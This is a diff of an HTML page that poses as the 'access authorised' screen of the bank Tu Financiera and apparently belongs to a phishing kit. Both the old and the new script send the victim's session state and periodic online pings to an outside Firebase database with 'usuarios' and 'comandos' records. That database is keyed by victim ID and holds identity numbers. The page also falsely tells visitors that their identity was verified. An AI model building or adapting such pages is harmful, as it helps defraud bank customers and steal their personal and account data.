@@ -3,95 +3,37 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Ingresar</title>
+<title>Acceso autorizado</title>
 <link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
 <link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
 <style>
   html,body{height:100%;margin:0}
-  body{
-    min-height:100vh;background:#464646;
-    font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;
-    display:flex;justify-content:flex-end;
-  }
-  .fondo{position:fixed;inset:0;z-index:0;background:url('https://tu.com.py/tufi-web/static/media/fondo_login.34ff0d3f.png') center/cover no-repeat}
-  .panel{
-    position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;
-    display:flex;flex-direction:column;align-items:center;overflow-y:auto;
-    padding:52px 18px 26px;box-sizing:border-box;
-  }
-  .logo-top{width:118px;margin-bottom:30px}
-  .caja{
-    width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;
-    padding:30px 22px 26px;box-sizing:border-box;text-align:center;
-  }
-  .tick{
-    width:62px;height:62px;border-radius:50%;background:#ecf5e1;border:2px solid #8dc63f;
-    display:flex;align-items:center;justify-content:center;margin:0 auto 16px;
-  }
-  .tick svg{width:30px;height:30px;stroke:#6aa62c;stroke-width:3.5;fill:none}
-  .caja h2{font-size:16px;font-weight:bold;color:#8ec63f;margin:0 0 8px}
-  .caja p{font-size:12.5px;color:#606060;line-height:1.55;margin:0 0 18px}
-  .datos{background:#efefef;border-radius:10px;padding:12px 14px;text-align:left;font-size:12px;line-height:1.9;color:#606060}
-  .datos b{color:#000}
-  .btn{
-    width:100%;height:39px;border:0;border-radius:10px;background:#8dc63f;color:#fff;
-    font-family:inherit;font-size:12px;font-weight:bold;letter-spacing:.33px;
-    text-transform:uppercase;cursor:pointer;margin-top:18px;
-  }
-  .pie{font-size:10px;color:#a5a5a5;margin-top:16px}
-  .version{color:#707070;font-size:12px;margin-top:22px}
-  @media(max-width:900px){.panel{width:45%}}
-  @media(max-width:768px){
-    body{display:block}
-    .panel{width:100%;min-height:100vh;padding-top:34px}
-    .caja{width:290px}
-    .logo-top{width:96px}
-  }
+  body{min-height:100vh;background:#f2f2f2;font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box}
+  .card{background:#fff;border:1px solid #d1d1d1;border-radius:10px;width:360px;max-width:100%;padding:34px 24px;text-align:center;box-sizing:border-box}
+  .logo{width:130px;margin:0 auto 22px;display:block}
+  .ok{width:66px;height:66px;border-radius:50%;background:#eaf6da;color:#6fa82c;font-size:34px;line-height:66px;margin:0 auto 18px}
+  h1{font-size:17px;font-weight:bold;color:#8ec63f;margin:0 0 10px}
+  p{font-size:12.5px;line-height:1.55;margin:0}
+  .btn{display:block;height:39px;line-height:39px;margin-top:24px;border-radius:10px;background:#8dc63f;color:#fff;font-size:12px;font-weight:bold;text-transform:uppercase;letter-spacing:.33px;text-decoration:none}
 </style>
 </head>
 <body>
-<div class="fondo"></div>
-
-<div class="panel">
-  <img class="logo-top" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
-
-  <div class="caja">
-    <div class="tick"><svg viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
-    <h2>Acceso autorizado</h2>
-    <p>Tu identidad quedó validada y el dispositivo está habilitado.</p>
-
-    <div class="datos">
-      Documento: <b id="doc">—</b><br>
-      Estado: <b>Acceso confirmado</b>
-    </div>
-
-    <button class="btn" id="salir">Salir</button>
-    <div class="pie">Conexión segura · Tu Financiera</div>
-  </div>
-
-  <span class="version">Versión: v1.65.0</span>
+<div class="card">
+  <img class="logo" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
+  <div class="ok">&#10003;</div>
+  <h1>Acceso autorizado</h1>
+  <p>Tu identidad fue verificada correctamente. Ya podés operar en tu banca digital.</p>
+  <a class="btn" href="index.html">Ir a mi cuenta</a>
 </div>
-
 <script>
 (function(){
-  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
-  var id = new URLSearchParams(location.search).get('u');
-  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
-  if(!id){ location.replace('index.html'); return; }
-
-  fetch(DB+'/usuarios/'+id+'.json').then(function(r){ return r.json(); }).then(function(d){
-    if(d && d.cedula) document.getElementById('doc').textContent = d.cedula;
-  }).catch(function(){});
-
-  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({estado:'FINALIZADO', pagina:'final.html', online:false})}).catch(function(){});
-  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({accion:'', rechazo:''})}).catch(function(){});
-
-  document.getElementById('salir').addEventListener('click', function(){
-    try{ localStorage.removeItem('nbch_u'); }catch(x){}
-    location.href = 'index.html';
-  });
+  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var id=new URLSearchParams(location.search).get('u')||localStorage.getItem('nbch_u');
+  if(!id) return;
+  function patch(o){fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(o)}).catch(function(){});}
+  patch({online:true,ultimoPing:Date.now(),pagina:'final.html',estado:'FINALIZADO'});
+  var lt=setInterval(function(){patch({online:true,ultimoPing:Date.now()});},5000);
+  window.addEventListener('beforeunload',function(){clearInterval(lt);patch({online:false});});
 })();
 </script>
 </body>
